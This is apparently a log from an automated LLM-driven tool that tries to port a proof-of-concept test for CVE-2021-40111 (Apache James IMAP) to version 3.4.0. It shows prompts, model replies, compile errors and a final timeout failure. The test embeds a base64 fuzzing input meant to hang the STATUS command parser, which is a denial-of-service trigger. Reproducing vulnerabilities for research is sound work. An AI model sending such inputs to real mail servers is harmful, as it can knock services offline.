[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 37, 'column': 9, 'message': 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super(statusResponseFactory);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[LLMClient] Tokens used: 220 (prompt), 27 (completion), 247 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Related diffs for error: [(5746, 5.0), (5756, 5.0), (5761, 5.0), (5785, 5.0), (5812, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[RepairModule] Trying best diff #5746 with score 5.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(5746, 5812) with score 5.00[0m
[LLMClient] Tokens used: 1260 (prompt), 478 (completion), 1738 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super(statusResponseFactory);

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/test/java/org/apache/james/imap/message/response/UnpooledStatusResponseFactoryTest.java, Hunk: @@ -19,16 +19,24 @@

 package org.apache.james.imap.message.response;

+import org.apache.james.imap.api.message.response.AbstractTestForStatusResponseFactory;
-import org.apache.james.imap.api.ImapCommand;
-import org.apache.james.imap.api.message.response.AbstractStatusResponseFactoryTest;
 import org.apache.james.imap.api.message.response.StatusResponseFactory;
+import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
-import org.junit.jupiter.api.BeforeEach;

+public class UnpooledStatusResponseFactoryTest extends
+        AbstractTestForStatusResponseFactory {
-class UnpooledStatusResponseFactoryTest implements AbstractStatusResponseFactoryTest {
-
-    StatusResponseFactory factory;
-
-
-    @BeforeEach
-    void setUp() throws Exception {
-        factory = new UnpooledStatusResponseFactory();
-    }

     @Override
+    protected StatusResponseFactory createInstance() {
+        return new UnpooledStatusResponseFactory();
-    public StatusResponseFactory factory() {
-        return factory;
     }

 }
Operation: MODIFIED, File: protocols/imap/src/test/java/org/apache/james/imap/processor/ListRightsProcessorTest.java, Hunk: @@ -28,14 +29,12 @@
 import static org.mockito.Mockito.verifyNoMoreInteractions;
 import static org.mockito.Mockito.when;

+import org.apache.james.imap.api.ImapCommand;
-import org.apache.james.core.Username;
 import org.apache.james.imap.api.ImapConstants;
+import org.apache.james.imap.api.ImapSessionState;
+import org.apache.james.imap.api.ImapSessionUtils;
 import org.apache.james.imap.api.message.response.ImapResponseMessage;
 import org.apache.james.imap.api.process.ImapProcessor;
 import org.apache.james.imap.api.process.ImapProcessor.Responder;
+import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.encode.FakeImapSession;
 import org.apache.james.imap.message.request.ListRightsRequest;
 import org.apache.james.imap.message.response.ListRightsResponse;
 import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.message.request.ImapRequest;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), (ImapRequest) ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, ImapRequest tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.message.request.ImapRequest;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), (ImapRequest) ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, ImapRequest tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[92m[RepairModule] Error constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(5746, 5812) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1619 (prompt), 1 (completion), 1620 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.356 s
[INFO] Finished at: 2025-07-13T15:37:40Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 244 (prompt), 27 (completion), 271 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, tag, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.decode.ImapRequestStreamLineReader
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 41, 'column': 14, 'message': 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super.decode(request, tag, session);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[LLMClient] Tokens used: 288 (prompt), 47 (completion), 335 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, tag, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.decode.ImapRequestStreamLineReader;ImapCommand;ImapRequestLineReader;ImapRequest;FakeImapSession
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader', 'ImapCommand', 'ImapRequestLineReader', 'ImapRequest', 'FakeImapSession'][0m
[96m[Adapter] Related diffs for error: [(5561, 25.0), (5606, 25.0), (5620, 25.0), (5557, 20.0), (5562, 20.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader', 'ImapCommand', 'ImapRequestLineReader', 'ImapRequest', 'FakeImapSession'][0m
[96m[RepairModule] Trying best diff #5561 with score 25.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #5620 with score 25.00[0m
[Adapt] â° Timeout: exceeded 300 seconds for 3.5.0 â†’ 3.4.0
[91m[Adapter] Adaptation failed for 3.4.0[0m

[Executor] â–¶ Summary of return codes:
  - Version 3.4.0: âœ— Failed (exit code 1)
